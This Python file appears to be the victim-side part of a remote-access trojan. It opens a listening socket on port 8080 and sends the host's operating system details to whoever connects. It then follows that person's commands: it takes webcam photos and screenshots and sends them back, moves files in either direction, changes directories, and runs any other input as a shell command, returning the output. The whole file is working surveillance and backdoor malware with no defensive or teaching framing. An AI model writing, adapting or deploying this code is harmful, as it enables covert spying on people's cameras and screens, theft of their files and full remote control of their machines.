from socket import *
import subprocess
import os
import cv2
import platform
import pyautogui

HOST = ''
PORT = 8080

s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)

connection, adresse = s.accept()
ops = platform.system() + " " + platform.release()
connection.send(bytes(ops, "utf8"))


def cam():
    try:
        camera = cv2.VideoCapture(0)
        res, image = camera.read()
        cv2.imwrite('cam.png', image)
        camera.release()
        del(camera)
    except:
        connection.send(bytes("error", "utf8"))
    picsize = os.path.getsize("./cam.png")
    pic = open("./cam.png", "rb")
    picdata = pic.read()
    pic.close()
    connection.send(bytes(str(picsize), "utf8"))
    connection.send(picdata)
    os.remove("./cam.png")
    pico = "get picture"
    connection.send(bytes(pico, "utf8"))


def screenshot():
    try:
        screen = pyautogui.screenshot()
        screen.save('./screenshot.png')
    except:
        connection.send(bytes("error", "utf8"))
    picsize = os.path.getsize("./screenshot.png")
    pic = open("./screenshot.png", "rb")
    picdata = pic.read()
    pic.close()
    connection.send(bytes(str(picsize), "utf8"))
    connection.send(picdata)
    os.remove("./screenshot.png")
    pico = "get picture"
    connection.send(bytes(pico, "utf8"))


def put_recieve(befehl):
    bef = str(befehl).split(" ")
    pfilename = str(bef[1])
    psi = connection.recv(256)
    psize = int(str(psi, "utf8"))
    pdata = connection.recv(psize)
    pfile = open(str(pfilename), "wb")
    pfile.write(pdata)
    pfile.flush()
    pfile.close()
    po = "put " + pfilename
    connection.send(bytes(po, "utf8"))


def get_send(befehl):
    bef = str(befehl).split(" ")
    gfilename = str(bef[1])
    if os.path.isfile(gfilename):
        gsize = os.path.getsize(gfilename)
        gfile = open(gfilename, "rb")
        gdata = gfile.read()
        gfile.close()
        connection.send(bytes(str(gsize), "utf8"))
        connection.send(gdata)
        go = "get " + gfilename
        connection.send(bytes(go, "utf8"))
    else:
        connection.send(bytes("error", "utf8"))


def cd(befehl):
    bef = befehl.split(" ")
    os.chdir(bef[1])
    wd = "you are now working in: " + os.getcwd()
    connection.send(bytes(wd, "utf8"))


def command():
    while True:
        bef = connection.recv(1024)
        befehl = bef.decode("utf8")
        if befehl == 'quit':
            connection.close()
            exit()
            break
        elif "put" in befehl:
            put_recieve(befehl)
        elif "get" in befehl:
            get_send(befehl)
        elif "cam" in befehl:
            cam()
        elif "screenshot" in befehl:
            screenshot()
        elif "cd" in befehl:
            cd(befehl)

        else:
            prozess = subprocess.Popen(
                befehl, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = prozess.stdout.read() + prozess.stderr.read()
            connection.send(output + " ".encode("utf8"))


command()
